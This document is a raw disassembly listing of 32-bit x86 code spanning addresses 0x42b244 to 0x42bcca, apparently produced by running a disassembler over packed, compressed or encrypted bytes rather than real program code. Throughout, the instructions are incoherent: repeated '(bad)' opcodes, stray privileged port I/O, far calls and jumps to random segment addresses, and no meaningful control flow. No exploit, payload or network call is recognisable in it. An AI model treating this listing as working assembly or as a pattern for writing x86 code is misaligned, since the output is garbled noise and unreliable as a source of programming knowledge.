  42b244:	call   0x29950200
  42b249:	adc    bl,BYTE PTR [edx]
  42b24b:	jno    0x42b270
  42b24d:	jle    0x42b239
  42b24f:	inc    esp
  42b250:	xor    BYTE PTR [esi+0x52ec0861],ch
  42b256:	mov    eax,0xf1c421a5
  42b25b:	test   esp,edi
  42b25d:	jbe    0x42b262
  42b25f:	mov    esi,0x7b1348d4
  42b264:	jns    0x42b2b7
  42b266:	js     0x42b2cf
  42b268:	iret   
  42b269:	cmp    eax,0x25c2e1b
  42b26e:	(bad)  
  42b26f:	jno    0x42b250
  42b271:	in     al,0xa5
  42b273:	mov    al,0x33
  42b275:	lods   eax,DWORD PTR ds:[esi]
  42b276:	inc    esi
  42b277:	rol    DWORD PTR [eax+0x450cd60a],1
  42b27d:	jecxz  0x42b21d
  42b27f:	mov    esi,0x97f5147
  42b284:	loope  0x42b27b
  42b286:	pop    ebp
  42b287:	popa   
  42b288:	or     eax,0xad3c599d
  42b28d:	add    DWORD PTR ss:[edx],edx
  42b290:	push   ebx
  42b291:	scas   eax,DWORD PTR es:[edi]
  42b292:	push   esi
  42b293:	pop    ecx
  42b294:	loopne 0x42b263
  42b296:	inc    ebp
  42b297:	les    edi,FWORD PTR [ecx+0x76]
  42b29a:	cmp    DWORD PTR [ebx-0x27122b07],0xffffff80
  42b2a1:	push   edi
  42b2a2:	bound  esi,QWORD PTR [edi-0x62d8d36b]
  42b2a8:	add    al,0x23
  42b2aa:	adc    BYTE PTR [edx-0x3319e6d2],ch
  42b2b0:	std    
  42b2b1:	in     al,dx
  42b2b2:	mov    bh,0x81
  42b2b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2b5:	mov    ds:0x8787acb9,al
  42b2ba:	lods   al,BYTE PTR ds:[esi]
  42b2bb:	data16 fsubr QWORD PTR [eax-0x42]
  42b2bf:	push   0xdf
	...
  42b334:	jg     0x42b344
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax-0x55],esi
  42b341:	jnp    0x42b2d5
  42b343:	in     eax,dx
  42b344:	push   edx
  42b345:	leave  
  42b346:	add    DWORD PTR [eax],eax
  42b348:	cmc    
  42b349:	add    BYTE PTR [eax],al
  42b34b:	add    BYTE PTR [ebx+0x3cfe5ca6],al
  42b351:	jnp    0x42b309
  42b353:	xor    esp,ecx
  42b355:	mov    bh,0xeb
  42b357:	jp     0x42b300
  42b359:	dec    ecx
  42b35a:	sub    al,cl
  42b35c:	or     eax,0x32daccd4
  42b361:	xchg   esp,eax
  42b363:	stos   DWORD PTR es:[edi],eax
  42b364:	loope  0x42b39d
  42b366:	mov    cl,0x3e
  42b368:	mov    ebx,0x761f89de
  42b36d:	mov    bh,0x88
  42b36f:	scas   eax,DWORD PTR es:[edi]
  42b370:	or     esi,0x65
  42b373:	pop    edi
  42b374:	xor    edx,eax
  42b376:	loopne 0x42b334
  42b378:	sbb    ecx,ebp
  42b37a:	or     al,0xc2
  42b37c:	lods   al,BYTE PTR ds:[esi]
  42b37d:	dec    esi
  42b37e:	fs inc eax
  42b380:	out    dx,al
  42b381:	fnsave [esp+eiz*8+0x34]
  42b385:	xchg   edi,eax
  42b386:	and    edx,DWORD PTR [ebx+0x6e5e3963]
  42b38c:	sub    eax,0xa952d2e7
  42b391:	mov    WORD PTR [edx+0x6dd78819],ss
  42b397:	inc    ebp
  42b398:	cld    
  42b399:	into   
  42b39a:	inc    eax
  42b39b:	sub    ebp,ecx
  42b39d:	xchg   edx,eax
  42b39e:	and    al,0x3c
  42b3a0:	aas    
  42b3a1:	add    al,0x87
  42b3a3:	inc    ebp
  42b3a4:	mov    ebp,edi
  42b3a6:	pop    edx
  42b3a7:	adc    eax,0x86b0d755
  42b3ac:	jae    0x42b371
  42b3ae:	or     DWORD PTR [esi],eax
  42b3b0:	fnstcw WORD PTR [eax-0xaba9207]
  42b3b6:	mov    cl,0x3
  42b3b8:	sbb    al,0x29
  42b3ba:	sub    DWORD PTR [ebx+esi*1],ebx
  42b3bd:	mov    BYTE PTR [ebx],dh
  42b3bf:	jbe    0x42b434
  42b3c1:	pop    eax
  42b3c2:	mov    ds:0xf93a39d2,al
  42b3c7:	jecxz  0x42b39c
  42b3c9:	inc    edx
  42b3ca:	fisub  WORD PTR [esi+0x6b]
  42b3cd:	loope  0x42b3c0
  42b3cf:	dec    edi
  42b3d0:	ins    BYTE PTR es:[edi],dx
  42b3d1:	push   0x52
  42b3d3:	sub    BYTE PTR [esi],ah
  42b3d5:	sbb    al,BYTE PTR [ebx+0x2782fb78]
  42b3db:	sub    ecx,DWORD PTR [edi]
  42b3dd:	pop    ecx
  42b3de:	xchg   edi,eax
  42b3df:	xchg   ebp,eax
  42b3e0:	imul   edx,DWORD PTR [eax+ebp*2+0x75],0x3790d0e6
  42b3e8:	call   DWORD PTR [edx+eax*4+0x4cfde1d4]
  42b3ef:	cmp    bh,0xf5
  42b3f2:	ret    
  42b3f3:	and    BYTE PTR [edi-0x26],dl
  42b3f6:	mov    bh,0x80
  42b3f8:	sub    ebp,DWORD PTR [ebx]
  42b3fa:	push   es
  42b3fb:	lock add DWORD PTR [ebx-0x4d],ebp
  42b3ff:	xchg   ecx,eax
  42b400:	in     eax,0x9c
  42b402:	mov    bh,0x53
  42b404:	dec    eax
  42b405:	xor    ecx,esi
  42b407:	and    ebx,ebx
  42b409:	mov    BYTE PTR [ebx+esi*2-0x79],ah
  42b40d:	mov    edx,0x53d731fc
  42b412:	test   DWORD PTR [ebx-0x1d],0x54a8abd1
  42b419:	xor    eax,DWORD PTR [eax-0x76]
  42b41c:	sbb    al,0x53
  42b41e:	into   
  42b41f:	pop    eax
  42b420:	pushf  
  42b421:	pushf  
  42b422:	(bad)  
  42b424:	jmp    0x42b3cf
  42b426:	gs sub eax,0x3ea71cd6
  42b42c:	int3   
  42b42d:	lods   eax,DWORD PTR ds:[esi]
  42b42e:	mov    esp,0x6adfdd82
  42b433:	sbb    ecx,esi
  42b435:	sar    BYTE PTR [ebp-0x34da08fd],1
  42b43b:	sub    eax,0x2df0aec5
  42b440:	fld    QWORD PTR [eax]
	...
  42b4b2:	add    BYTE PTR [eax],al
  42b4b4:	sbb    BYTE PTR [edi+0x17],cl
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	ret    0x933
  42b4c3:	mov    al,0x47
  42b4c5:	retf   0x1
  42b4c8:	cmc    
  42b4c9:	add    BYTE PTR [eax],al
  42b4cb:	add    bl,dl
  42b4cd:	les    ebx,FWORD PTR [edi]
  42b4cf:	fiadd  WORD PTR [ecx]
  42b4d1:	sub    eax,edx
  42b4d3:	(bad)  
  42b4d4:	scas   al,BYTE PTR es:[edi]
  42b4d5:	and    BYTE PTR [eax+0xf],0x4a
  42b4d9:	je     0x42b4a6
  42b4db:	aam    0x1f
  42b4dd:	lea    ecx,ds:0xb8d1fac3
  42b4e3:	push   ebp
  42b4e4:	out    dx,al
  42b4e5:	push   cs
  42b4e6:	xchg   edx,eax
  42b4e7:	pop    eax
  42b4e8:	mov    ah,0xff
  42b4ea:	test   al,0x2a
  42b4ec:	ins    DWORD PTR es:[edi],dx
  42b4ed:	or     dl,dl
  42b4ef:	inc    edx
  42b4f0:	pusha  
  42b4f1:	fdivr  st,st(5)
  42b4f3:	ds aad 0xab
  42b4f6:	push   ss
  42b4f7:	(bad)  
  42b4f8:	add    WORD PTR ds:0x4404de5e,ax
  42b4ff:	add    bh,ah
  42b501:	mov    esi,0x5971c6dc
  42b506:	xlat   BYTE PTR ds:[ebx]
  42b507:	addr16 push ebp
  42b509:	xchg   ebx,eax
  42b50a:	cmp    esp,DWORD PTR [edx]
  42b50c:	in     eax,dx
  42b50d:	les    eax,FWORD PTR ds:0x10cce4fa
  42b513:	or     eax,DWORD PTR [esi+0x13aaa599]
  42b519:	in     al,0xbb
  42b51b:	cmc    
  42b51c:	xor    al,0x84
  42b51e:	cmp    edx,DWORD PTR [eax+0x49a674e0]
  42b524:	mov    ss,WORD PTR [ebx]
  42b526:	pushf  
  42b527:	cmc    
  42b528:	add    eax,0x9bb74962
  42b52d:	jle    0x42b506
  42b52f:	jbe    0x42b544
  42b531:	pop    esp
  42b532:	sbb    DWORD PTR [ebp-0x61],edi
  42b535:	inc    esp
  42b536:	shl    edi,1
  42b538:	jge    0x42b55e
  42b53a:	pop    es
  42b53b:	cmp    eax,0xdd7d983f
  42b540:	pop    ss
  42b541:	inc    esp
  42b542:	imul   ebx,DWORD PTR [esi-0x23],0xe64104cd
  42b549:	lahf   
  42b54a:	pop    ss
  42b54b:	sbb    DWORD PTR [edi-0x766bf5d5],esi
  42b551:	pop    ebp
  42b552:	push   esp
  42b553:	jg     0x42b57e
  42b555:	cli    
  42b556:	dec    eax
  42b557:	cld    
  42b558:	push   0xfffffff5
  42b55a:	out    dx,eax
  42b55b:	ds mov ebx,0xc6330d16
  42b561:	cmc    
  42b562:	sub    BYTE PTR [esp+ebp*2-0x5058045f],bl
  42b569:	pop    es
  42b56a:	adc    al,0x43
  42b56c:	pop    ecx
  42b56d:	out    dx,eax
  42b56e:	sbb    eax,0x11e48f4e
  42b573:	out    0x1,eax
  42b575:	inc    ecx
  42b576:	sub    BYTE PTR ds:0x6305ca7a,ah
  42b57c:	cmp    ebp,DWORD PTR [ebp+0x417952a5]
  42b582:	cld    
  42b583:	int    0xfb
  42b585:	cdq    
  42b586:	shr    BYTE PTR [esi-0x218f33c0],cl
  42b58c:	shr    ebx,cl
  42b58e:	call   0x89d9:0xc29fbced
  42b595:	jne    0x42b594
  42b597:	mov    bh,BYTE PTR [edi-0x45eb94cc]
  42b59d:	fild   WORD PTR [ebx]
  42b59f:	popf   
  42b5a0:	add    cl,BYTE PTR [edx]
  42b5a2:	adc    eax,0x13e3c746
  42b5a7:	test   al,0x32
  42b5a9:	shl    eax,1
  42b5ab:	lock bound esi,QWORD PTR [eax-0x2282f36b]
  42b5b2:	int3   
  42b5b3:	dec    ecx
  42b5b4:	add    BYTE PTR [ecx+0x2f834209],dh
  42b5ba:	ret    0x232
  42b5bd:	in     al,dx
  42b5be:	mov    ebx,0x2f06
	...
  42b633:	add    BYTE PTR [esi+edx*1],ah
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    bh,bl
  42b641:	imul   edx,DWORD PTR [edx+0x1cb3c7a],0x0
  42b648:	cmc    
  42b649:	add    BYTE PTR [eax],al
  42b64b:	add    dh,dl
  42b64d:	mov    dh,0xb6
  42b64f:	dec    edx
  42b650:	pop    edx
  42b651:	dec    ebp
  42b652:	pop    eax
  42b653:	aam    0x17
  42b655:	xor    BYTE PTR [esi],dl
  42b657:	cmp    dl,bl
  42b659:	pop    edi
  42b65a:	scas   eax,DWORD PTR es:[edi]
  42b65b:	jge    0x42b5ed
  42b65d:	jmp    0x65748191
  42b662:	outs   dx,DWORD PTR ds:[esi]
  42b663:	lea    eax,[edi-0x2ce1056b]
  42b669:	mov    edi,0x107352be
  42b66e:	or     cl,bl
  42b670:	ret    
  42b671:	add    BYTE PTR [esi+eax*2+0x8b8ce4f],0x69
  42b679:	pushf  
  42b67a:	xchg   esi,eax
  42b67b:	shl    dh,cl
  42b67d:	aam    0x7
  42b67f:	adc    dh,BYTE PTR [ebp-0x642a663f]
  42b685:	icebp  
  42b686:	icebp  
  42b687:	jnp    0x42b6e5
  42b689:	inc    edx
  42b68a:	dec    BYTE PTR [edx]
  42b68c:	xchg   bh,bl
  42b68e:	sub    ch,cl
  42b690:	sbb    ecx,eax
  42b692:	ret    0x5ea8
  42b695:	add    BYTE PTR [edi-0x70fe7ae5],0xd4
  42b69c:	out    0x82,al
  42b69e:	es loop 0x42b675
  42b6a1:	push   eax
  42b6a2:	pop    ebp
  42b6a3:	sub    eax,0xcddf3a56
  42b6a8:	adc    eax,DWORD PTR [edx+0x5e]
  42b6ab:	int    0xe8
  42b6ad:	or     esi,DWORD PTR [edi-0x6c]
  42b6b0:	xlat   BYTE PTR ds:[ebx]
  42b6b1:	mov    bh,0x8f
  42b6b3:	inc    edi
  42b6b4:	sub    BYTE PTR [eax],0x9
  42b6b7:	sahf   
  42b6b8:	sahf   
  42b6b9:	stc    
  42b6ba:	dec    esi
  42b6bb:	inc    DWORD PTR [ecx]
  42b6bd:	je     0x42b718
  42b6bf:	pop    ebx
  42b6c0:	jo     0x42b6c1
  42b6c2:	ss fsub st,st(3)
  42b6c5:	aad    0x8a
  42b6c7:	pop    ebx
  42b6c8:	getsec 
  42b6ca:	adc    ch,BYTE PTR [edx+0x798b44d7]
  42b6d0:	sti    
  42b6d1:	mov    esp,0x449b273b
  42b6d6:	dec    eax
  42b6d7:	push   ebp
  42b6d8:	jmp    0x3392:0x15f93fb4
  42b6df:	cmc    
  42b6e0:	and    ebp,DWORD PTR [edi+0x74]
  42b6e3:	pushf  
  42b6e4:	sbb    edx,DWORD PTR [edi+0x7d369ab7]
  42b6ea:	frstor fs:[ecx+0x6fce569c]
  42b6f1:	ins    DWORD PTR es:[edi],dx
  42b6f2:	das    
  42b6f3:	and    ebp,edx
  42b6f5:	into   
  42b6f6:	xor    eax,0x7bc91399
  42b6fb:	aam    0x2e
  42b6fd:	xchg   BYTE PTR [edi],bh
  42b6ff:	ds push ss
  42b701:	stos   DWORD PTR es:[edi],eax
  42b702:	cmp    BYTE PTR [ecx+0x55],ah
  42b705:	data16 sbb ah,BYTE PTR [eax-0x334963a5]
  42b70c:	in     al,0xf5
  42b70e:	jge    0x42b6f2
  42b710:	jno    0x42b6ae
  42b712:	and    edi,DWORD PTR [ebp+0x64]
  42b715:	jns    0x42b6e3
  42b717:	inc    esp
  42b718:	aas    
  42b719:	mov    fs,WORD PTR [ebx]
  42b71b:	push   eax
  42b71c:	push   esp
  42b71d:	movzx  ebp,ax
  42b720:	mov    ds:0x48243c88,eax
  42b725:	retf   0x4d5a
  42b728:	fbstp  TBYTE PTR [eax*2+0x61b50a53]
  42b72f:	xchg   DWORD PTR [ecx-0x14b8c7da],ebx
  42b735:	popa   
  42b736:	jle    0x42b7b2
  42b738:	mov    dl,bh
  42b73a:	sar    BYTE PTR [esi-0x63],cl
  42b73d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b73e:	cwde   
  42b73f:	pop    ss
  42b740:	cdq    
	...
  42b7b1:	add    BYTE PTR [eax],al
  42b7b3:	add    BYTE PTR [edx-0x10409c9b],cl
  42b7b9:	mov    edi,0x986a75de
  42b7be:	xor    eax,0xad376ffb
  42b7c3:	xchg   edi,eax
  42b7c4:	xor    esp,ecx
  42b7c6:	add    DWORD PTR [eax],eax
  42b7c8:	cmc    
  42b7c9:	add    BYTE PTR [eax],al
  42b7cb:	add    BYTE PTR [eax-0x31b261f6],ch
  42b7d1:	ret    
  42b7d2:	scas   eax,DWORD PTR es:[edi]
  42b7d3:	bound  ecx,QWORD PTR [eax-0x4f]
  42b7d6:	sti    
  42b7d7:	fisubr WORD PTR [edx+0x35e471aa]
  42b7dd:	jae    0x42b848
  42b7df:	xchg   ecx,eax
  42b7e0:	pop    ebx
  42b7e1:	dec    esi
  42b7e2:	jno    0x42b84a
  42b7e4:	push   es
  42b7e5:	aam    0x8e
  42b7e7:	push   ds
  42b7e8:	cdq    
  42b7e9:	fptan  
  42b7eb:	jg     0x42b7fe
  42b7ed:	mov    dl,0x48
  42b7ef:	xchg   esi,eax
  42b7f0:	mov    al,0x3c
  42b7f2:	rcl    dl,1
  42b7f4:	outs   dx,BYTE PTR ds:[esi]
  42b7f5:	mov    bl,BYTE PTR ds:0x284eeaa2
  42b7fb:	bound  edi,QWORD PTR [esi+0x18324b85]
  42b801:	aad    0xb1
  42b803:	add    al,0xc1
  42b805:	sub    DWORD PTR [edx+0x6f],esp
  42b808:	test   eax,0x9d007651
  42b80d:	stos   DWORD PTR es:[edi],eax
  42b80e:	pusha  
  42b80f:	sub    al,0x96
  42b811:	jns    0x42b876
  42b813:	in     al,dx
  42b814:	cs pop ds
  42b816:	xor    esi,DWORD PTR [eax+esi*8+0x3537bd36]
  42b81d:	and    DWORD PTR [esi+edx*4+0x21c2e74f],esp
  42b824:	loopne 0x42b815
  42b826:	aam    0xe6
  42b828:	aaa    
  42b829:	gs and eax,0xb97e6280
  42b82f:	or     dl,BYTE PTR [edx]
  42b831:	arpl   WORD PTR [ebx-0x22],dx
  42b834:	bound  ebx,QWORD PTR [edx+0x53a8cb69]
  42b83a:	push   esi
  42b83b:	mov    edi,DWORD PTR [ebp-0x4688b75a]
  42b841:	call   0x964:0x661c5cd3
  42b848:	inc    BYTE PTR [ebx-0x12]
  42b84b:	aam    0x1a
  42b84d:	sar    BYTE PTR [ebp+0x35c20339],cl
  42b853:	outs   dx,DWORD PTR ds:[esi]
  42b854:	sbb    DWORD PTR [eax+0x7],0xa8ae21e3
  42b85b:	sahf   
  42b85c:	lahf   
  42b85d:	jmp    0x51ecd6a0
  42b862:	sbb    DWORD PTR [eax],ecx
  42b864:	call   0x29fcf092
  42b869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b86a:	jo     0x42b8e4
  42b86c:	mov    ds:0xf3cbc8dd,al
  42b871:	or     dh,BYTE PTR [edi+0x2ff0f096]
  42b877:	test   bh,ah
  42b879:	jmp    0x42b800
  42b87b:	repnz or al,0x96
  42b87e:	xchg   DWORD PTR [esi-0x5b89402d],esi
  42b884:	mov    ecx,0x54738b24
  42b889:	(bad)  
  42b88a:	in     eax,0x20
  42b88c:	nop
  42b88d:	out    dx,al
  42b88e:	jns    0x42b826
  42b890:	dec    esp
  42b891:	pop    ss
  42b892:	into   
  42b893:	xor    eax,edx
  42b895:	icebp  
  42b896:	adc    al,BYTE PTR [ecx]
  42b898:	sub    ecx,ebp
  42b89a:	mov    ah,0x43
  42b89c:	iret   
  42b89d:	and    DWORD PTR [eax+0x1eb70d0e],eax
  42b8a3:	and    edi,ebp
  42b8a5:	adc    eax,0x43b7b9c8
  42b8aa:	and    bh,cl
  42b8ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b8ad:	or     BYTE PTR [ebp+0x1b],ah
  42b8b0:	ins    DWORD PTR es:[edi],dx
  42b8b1:	fnstsw WORD PTR [eax+0x19]
  42b8b4:	add    eax,0x2186187
  42b8b9:	outs   dx,DWORD PTR ds:[esi]
  42b8ba:	int3   
  42b8bb:	xchg   esi,eax
  42b8bc:	pusha  
  42b8bd:	mov    edx,0xd79c31
	...
  42b932:	add    BYTE PTR [eax],al
  42b934:	test   al,0x93
  42b936:	sbb    eax,0xfbee3fee
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	jae    0x42b8f1
  42b942:	xchg   esp,eax
  42b943:	dec    edi
  42b944:	es int 0x1
  42b947:	add    ch,dh
  42b949:	add    BYTE PTR [eax],al
  42b94b:	add    ah,cl
  42b94d:	mov    esp,ebp
  42b94f:	add    bh,cl
  42b951:	mov    ah,0x8c
  42b953:	das    
  42b954:	jg     0x42b8f4
  42b956:	adc    DWORD PTR [ebp-0x2e],0x5de71767
  42b95d:	sub    bl,dl
  42b95f:	mov    ebx,DWORD PTR [edx+0x8]
  42b962:	mov    ds:0xee5489f4,al
  42b967:	call   0x3f91:0xb32d1b04
  42b96e:	xor    ebp,DWORD PTR [ecx+edi*8]
  42b971:	(bad)  
  42b972:	fcomp  DWORD PTR [esi-0x24541bc0]
  42b978:	add    al,0x71
  42b97a:	imul   eax,DWORD PTR [esi],0x67
  42b97d:	int3   
  42b97e:	mov    bl,0xfb
  42b980:	call   0x2897:0x65fccb69
  42b987:	inc    edi
  42b988:	pop    esi
  42b989:	push   esp
  42b98a:	mov    eax,ds:0x2fad1891
  42b98f:	retf   
  42b990:	popf   
  42b991:	mov    DWORD PTR [ecx],edx
  42b993:	jmp    0x42b94f
  42b995:	das    
  42b996:	mov    edx,0x6904586b
  42b99b:	outs   dx,DWORD PTR ds:[esi]
  42b99c:	jo     0x42b955
  42b99e:	clc    
  42b99f:	fwait
  42b9a0:	scas   eax,DWORD PTR es:[edi]
  42b9a1:	call   0x9721:0xb480a319
  42b9a8:	push   ds
  42b9a9:	nop/reserved BYTE PTR [ebp-0x5aa5166f]
  42b9b0:	jb     0x42b9f3
  42b9b2:	cmc    
  42b9b3:	test   al,0x77
  42b9b5:	mov    ebx,0xd103809e
  42b9ba:	rcl    BYTE PTR [edx-0x16099c4f],cl
  42b9c0:	cld    
  42b9c1:	mov    edi,0x4ffa2e4e
  42b9c6:	jno    0x42b9c3
  42b9c8:	sub    BYTE PTR [edx-0x613e1aed],dh
  42b9ce:	push   edx
  42b9cf:	test   DWORD PTR [edi*2+0x2db57675],eax
  42b9d6:	pop    ebp
  42b9d7:	mov    eax,ds:0x2337cf44
  42b9dc:	retf   0x7342
  42b9df:	loope  0x42ba3d
  42b9e1:	xor    ah,dl
  42b9e3:	aam    0xcf
  42b9e5:	test   eax,0x28e0b0d9
  42b9ea:	aaa    
  42b9eb:	dec    eax
  42b9ec:	xor    eax,0xb4acfea1
  42b9f1:	leave  
  42b9f2:	or     esp,DWORD PTR [ebp+0x144f1fb9]
  42b9f8:	jns    0x42ba6e
  42b9fa:	imul   ecx,DWORD PTR [edi],0x52e1e062
  42ba00:	aas    
  42ba01:	clc    
  42ba02:	mov    cl,0xe5
  42ba04:	popf   
  42ba05:	ret    
  42ba06:	mov    edx,0xea637908
  42ba0b:	test   al,0xde
  42ba0d:	xor    BYTE PTR [eax+0x1c03209a],bl
  42ba13:	pop    esi
  42ba14:	jl     0x42b9ac
  42ba16:	pop    ecx
  42ba17:	mov    BYTE PTR [ebx*1-0x37d79ac0],bl
  42ba1e:	dec    esp
  42ba1f:	or     DWORD PTR [esi-0x47],ebx
  42ba22:	cli    
  42ba23:	fcomp  QWORD PTR [edx]
  42ba25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba26:	sbb    al,0x52
  42ba28:	outs   dx,DWORD PTR ds:[esi]
  42ba29:	pop    ss
  42ba2a:	adc    edi,DWORD PTR [ebp-0x29]
  42ba2d:	push   eax
  42ba2e:	and    DWORD PTR [esi-0x4a],0xffffffb1
  42ba32:	aaa    
  42ba33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba34:	ffreep st(4)
  42ba36:	sbb    dl,dl
  42ba38:	into   
  42ba39:	clc    
  42ba3a:	mov    al,ds:0x2167f3b3
  42ba3f:	repz pop esp
	...
  42bab1:	add    BYTE PTR [eax],al
  42bab3:	add    BYTE PTR [esi],bh
  42bab5:	push   cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi+0x64ac434c]
  42bac2:	test   DWORD PTR [edi+0x1ce1b],ebx
  42bac8:	cmc    
  42bac9:	add    BYTE PTR [eax],al
  42bacb:	add    BYTE PTR [ebp+0x4bac1f4a],bl
  42bad1:	xor    DWORD PTR [esi+0xad40b29],ecx
  42bad7:	lds    edx,FWORD PTR [eax-0x574f1867]
  42badd:	inc    edi
  42bade:	inc    esp
  42badf:	push   esi
  42bae0:	repnz push ds
  42bae2:	push   eax
  42bae3:	jl     0x42bab2
  42bae5:	(bad)  
  42bae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bae7:	lods   al,BYTE PTR ds:[esi]
  42bae8:	pop    esp
  42bae9:	int3   
  42baea:	fwait
  42baeb:	jno    0x42bacc
  42baed:	outs   dx,DWORD PTR ds:[esi]
  42baee:	test   cl,ah
  42baf0:	call   0xb0bd:0x8efe23fb
  42baf7:	dec    edx
  42baf8:	out    dx,al
  42baf9:	push   edi
  42bafa:	cmp    eax,0xf57600c2
  42baff:	cmp    al,0x9e
  42bb01:	fisttp WORD PTR [edi+0x155e6c33]
  42bb07:	add    esp,DWORD PTR [esi-0x5b26aad0]
  42bb0d:	in     al,0x3f
  42bb0f:	push   esi
  42bb10:	dec    esp
  42bb11:	sub    al,0x31
  42bb13:	in     eax,0x66
  42bb15:	dec    eax
  42bb16:	adc    al,0xda
  42bb18:	call   0xb7b8:0xf53a2576
  42bb1f:	mov    edi,0xc18b9c44
  42bb24:	je     0x42bb5a
  42bb26:	fld    QWORD PTR [edi]
  42bb28:	and    eax,0xf3df4655
  42bb2d:	sub    dh,BYTE PTR ds:0x61686645
  42bb33:	or     ebx,DWORD PTR [edi-0x27]
  42bb36:	fimul  DWORD PTR [ebx+ebp*8-0x7d]
  42bb3a:	jb     0x42bba8
  42bb3c:	call   ebx
  42bb3e:	and    al,0x9b
  42bb40:	retf   0x9100
  42bb43:	int    0x88
  42bb45:	rcl    BYTE PTR [eax+0x288ac192],cl
  42bb4b:	add    al,0xa3
  42bb4d:	mov    ebp,0x371ca65b
  42bb52:	or     ch,BYTE PTR [eax]
  42bb54:	call   0xdacf:0xedf0acb5
  42bb5b:	or     ebx,DWORD PTR [ecx-0x51]
  42bb5e:	jp     0x42bbb4
  42bb60:	adc    cl,BYTE PTR [esi]
  42bb62:	(bad)  
  42bb63:	jmp    0x42bb0e
  42bb65:	bound  ebp,QWORD PTR [ebp+ebp*8+0x3acc673b]
  42bb6c:	lods   eax,DWORD PTR ds:[esi]
  42bb6d:	icebp  
  42bb6e:	pushf  
  42bb6f:	push   cs
  42bb70:	xor    dl,BYTE PTR [ecx-0x50]
  42bb73:	clc    
  42bb74:	add    DWORD PTR [ebp-0x24380c87],ebx
  42bb7a:	scas   eax,DWORD PTR es:[edi]
  42bb7b:	adc    al,BYTE PTR [ebx]
  42bb7d:	hlt    
  42bb7e:	pushf  
  42bb7f:	mov    ah,0x45
  42bb81:	xchg   edi,eax
  42bb82:	shl    BYTE PTR [edx+0x70],cl
  42bb85:	cmp    ch,dh
  42bb87:	mov    al,0xfa
  42bb89:	sbb    DWORD PTR ds:0x88e931bc,0xd986ad
  42bb93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb94:	ficom  WORD PTR [ebx]
  42bb96:	dec    edi
  42bb97:	xor    BYTE PTR [edi],ch
  42bb99:	imul   esi,ebx,0x79567bae
  42bb9f:	inc    edi
  42bba0:	or     DWORD PTR [eax+0x1a],ebx
  42bba3:	mov    eax,0x67696f74
  42bba8:	add    DWORD PTR [ebx+0x4fa4048e],edi
  42bbae:	jmp    0x6ca25c69
  42bbb3:	and    dl,BYTE PTR [eax+0x5204182d]
  42bbb9:	push   ss
  42bbba:	aas    
  42bbbb:	data16 (bad) 
  42bbbd:	mov    eax,0x69f465
	...
  42bc32:	add    BYTE PTR [eax],al
  42bc34:	jmp    0xdf7cd86b
  42bc39:	ds out dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0xbb
  42bc41:	shl    esi,cl
  42bc43:	cmp    DWORD PTR [eax],edx
  42bc45:	iret   
  42bc46:	add    DWORD PTR [eax],eax
  42bc48:	cmc    
  42bc49:	add    BYTE PTR [eax],al
  42bc4b:	add    BYTE PTR [eax],bl
  42bc4d:	and    al,0x11
  42bc4f:	lahf   
  42bc50:	xlat   BYTE PTR ds:[ebx]
  42bc51:	sar    DWORD PTR [edi+ebx*8],cl
  42bc54:	inc    edx
  42bc55:	push   es
  42bc56:	dec    edi
  42bc57:	call   0xb0163a5
  42bc5c:	test   ebp,ecx
  42bc5e:	fwait
  42bc5f:	sub    al,0x5a
  42bc61:	push   esp
  42bc62:	adc    al,0xe4
  42bc64:	mov    ch,0x29
  42bc66:	imul   ebp,DWORD PTR [eax+0x7e05289],0x9d0bb115
  42bc70:	pop    ss
  42bc71:	dec    ecx
  42bc72:	xchg   edx,eax
  42bc73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc74:	mov    WORD PTR [edx+0xf],?
  42bc77:	into   
  42bc78:	xlat   BYTE PTR ds:[ebx]
  42bc79:	push   eax
  42bc7a:	inc    edx
  42bc7b:	mov    ah,0x5
  42bc7d:	loop   0x42bcce
  42bc7f:	adc    al,BYTE PTR [eax+0x369d7321]
  42bc85:	ret    0x4da4
  42bc88:	fistp  DWORD PTR [ecx-0x14]
  42bc8b:	sbb    ebx,DWORD PTR ds:0xdcdde4e0
  42bc91:	adc    DWORD PTR [esi+0x680f9259],esp
  42bc97:	stos   DWORD PTR es:[edi],eax
  42bc98:	xchg   esi,eax
  42bc99:	daa    
  42bc9a:	aad    0xf1
  42bc9c:	and    ch,al
  42bc9e:	(bad)  
  42bc9f:	ja     0x42bc22
  42bca1:	fisubr DWORD PTR [ebp+eax*8-0x50]
  42bca5:	test   esp,ebp
  42bca7:	inc    ebp
  42bca8:	pop    esi
  42bca9:	mov    al,0xe1
  42bcab:	jp     0x42bc9d
  42bcad:	loope  0x42bcd3
  42bcaf:	mov    al,ds:0x9a73714f
  42bcb4:	add    ecx,edx
  42bcb6:	push   0x7c
  42bcb8:	ins    BYTE PTR es:[edi],dx
  42bcb9:	rcr    DWORD PTR [edx],cl
  42bcbb:	test   BYTE PTR [ecx+0x1321d074],ah
  42bcc1:	stos   BYTE PTR es:[edi],al
  42bcc2:	js     0x42bd36
  42bcc4:	sbb    dl,BYTE PTR [eax+edi*8]
  42bcc7:	jo     0x42bc81
  42bcc9:	push   eax
  42bcca:	outs   dx,BYTE PTR ds:[esi]
